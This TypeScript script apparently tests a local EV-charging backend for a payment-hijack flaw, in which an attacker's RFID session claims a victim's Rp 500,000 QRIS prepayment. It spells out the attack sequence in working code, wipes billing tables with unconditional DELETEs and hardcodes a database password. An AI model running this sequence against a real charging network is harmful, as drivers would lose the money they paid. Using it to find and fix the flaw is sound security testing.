import { CP, sleep } from './cp.js';
import pg from 'pg';
const db=new pg.Pool({connectionString:'postgresql://postgres:plugsure@127.0.0.1:5432/plugsure_r3b'});
const L=(s:string)=>console.log(s);
const q=async(sql:string,p:any[]=[])=>(await db.query(sql,p)).rows;
const API='http://127.0.0.1:9600', CPID='AUTEL-DC60-SMB-002';
const post=async(u:string,b:any)=>{const r=await fetch(API+u,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(b)});return{s:r.status,b:await r.json() as any};};
async function main(){
  const cp=await(new CP(CPID)).connect(); await cp.boot(); await sleep(1200);
  await q(`DELETE FROM cdr`);await q(`DELETE FROM meter_value`);await q(`UPDATE payment_intent SET session_id=NULL`);await q(`DELETE FROM charging_session`);await q(`DELETE FROM payment_intent`);
  await q(`DELETE FROM tariff_assignment WHERE scope_type='connector'`);

  L('=== Z1. VICTIM (RFID-0002) pays Rp 500,000 by QRIS. ATTACKER (RFID-0001) plugs in first. ===');
  const v=await post('/v1/checkout/qris',{ocppIdentity:CPID,connectorId:1,amountIdr:500_000});
  L(`  victim quote: allowanceWh=${v.b.allowanceWh} (Rp 500,000). NOTE: the checkout body has no driver/idToken field at all.`);
  await post(`/v1/checkout/qris/${v.b.qr.providerRef}/simulate-payment`,{});
  const s=await cp.call('StartTransaction',{connectorId:1,idTag:'ID-RFID-0001',meterStart:0,timestamp:'2026-08-24T10:00:00Z'});
  await sleep(500);
  const r=(await q(`SELECT cs.payment_mode,cs.prepaid_amount_idr,cs.prepaid_energy_wh,t.uid FROM charging_session cs LEFT JOIN token t ON t.id=cs.token_id ORDER BY cs.created_at DESC LIMIT 1`))[0];
  L(`  session started by ${r.uid}: payment_mode=${r.payment_mode} prepaid_amount=Rp ${r.prepaid_amount_idr} allowance=${r.prepaid_energy_wh} Wh`);
  const hij = r.uid === 'ID-RFID-0001' && Number(r.prepaid_amount_idr) === 500000;
  L('  >>> ' + (hij ? 'HIJACKED: attacker paid nothing and holds the victim Rp 500,000 allowance = ' + (Number(r.prepaid_energy_wh)/1000).toFixed(1) + ' kWh' : 'not hijacked'));
  await cp.call('StopTransaction',{transactionId:s.transactionId,meterStop:Number(r.prepaid_energy_wh),timestamp:'2026-08-24T12:00:00Z',reason:'Local'});
  await sleep(1000);
  const c=(await q(`SELECT d.total_idr FROM cdr d ORDER BY d.issued_at DESC LIMIT 1`))[0];
  L(`  attacker's CDR = Rp ${c?.total_idr}; victim's Rp 500,000 is captured and bound to the attacker's session.`);
  L(`  victim intents left unbound/unrefunded: ${JSON.stringify(await q(`SELECT amount_authorised_idr amt,state,session_id IS NOT NULL bound FROM payment_intent`))}`);
  await db.end(); cp.close(); process.exit(0);
}
main().catch(e=>{console.error(e);process.exit(1);});
